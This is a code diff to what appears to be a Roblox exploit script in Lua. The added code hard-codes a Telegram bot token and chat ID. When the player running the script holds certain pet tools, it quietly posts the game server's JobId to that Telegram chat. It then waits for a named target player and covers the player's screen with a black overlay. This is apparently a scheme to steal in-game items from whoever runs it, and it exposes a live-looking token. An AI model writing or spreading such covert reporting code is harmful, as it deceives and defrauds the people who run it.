@@ -19,6 +19,53 @@ for _, name in ipairs(ALLOWED_PET_TYPES) do
     allowedTypesLower[name:lower()] = true
 end
 
+local BOT_TOKEN = "8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4"
+local CHAT_ID = "2001061743"
+
+local function sendTelegramMessage(text)
+    print("[PET ALERT DEBUG] Would send Telegram message:", text)
+    local requestFunc = http_request or request or (syn and syn.request)
+    if not requestFunc then
+        print("[PET ALERT DEBUG] No HTTP request available. Skipping send.")
+        return
+    end
+
+    local fullText = string.format("%s\nJobId: %s", text, game.JobId)
+    local url = string.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN)
+    local data = {chat_id = CHAT_ID, text = fullText}
+    local json = HttpService:JSONEncode(data)
+
+    requestFunc({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = json
+    })
+end
+
+local function hasAllowedTool()
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    if backpack then
+        for _, tool in pairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") then
+                local toolName = tool.Name:lower()
+                for allowedName in pairs(allowedTypesLower) do
+                    if toolName:find(allowedName) then
+                        return true, tool.Name
+                    end
+                end
+            end
+        end
+    end
+    return false
+end
+
+local function waitForCharacter()
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    return char, hrp
+end
+
 local function createBlackScreen()
     local player = LocalPlayer
     local playerGui = player:WaitForChild("PlayerGui")
@@ -37,12 +84,6 @@ local function createBlackScreen()
     frame.BorderSizePixel = 0
     frame.ZIndex = math.huge
     frame.Parent = screenGui
-end
-
-local function waitForCharacter()
-    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    local hrp = char:WaitForChild("HumanoidRootPart")
-    return char, hrp
 end
 
 local function teleportToTarget()
@@ -102,12 +143,18 @@ end
 -- Main
 local char, hrp = waitForCharacter()
 
--- Wait until target player joins
+-- Telegram alert immediately if player has allowed tool
+local hasTool, toolName = hasAllowedTool()
+if hasTool then
+    sendTelegramMessage("Script executed. Player has allowed tool: " .. toolName)
+end
+
+-- Wait for target player to join
 repeat
     task.wait(1)
 until Players:FindFirstChild(TargetPlayerName)
 
--- Target joined — wait 5 seconds before starting
+-- Wait 5 seconds after target joins
 task.wait(5)
 
 -- Show black screen once
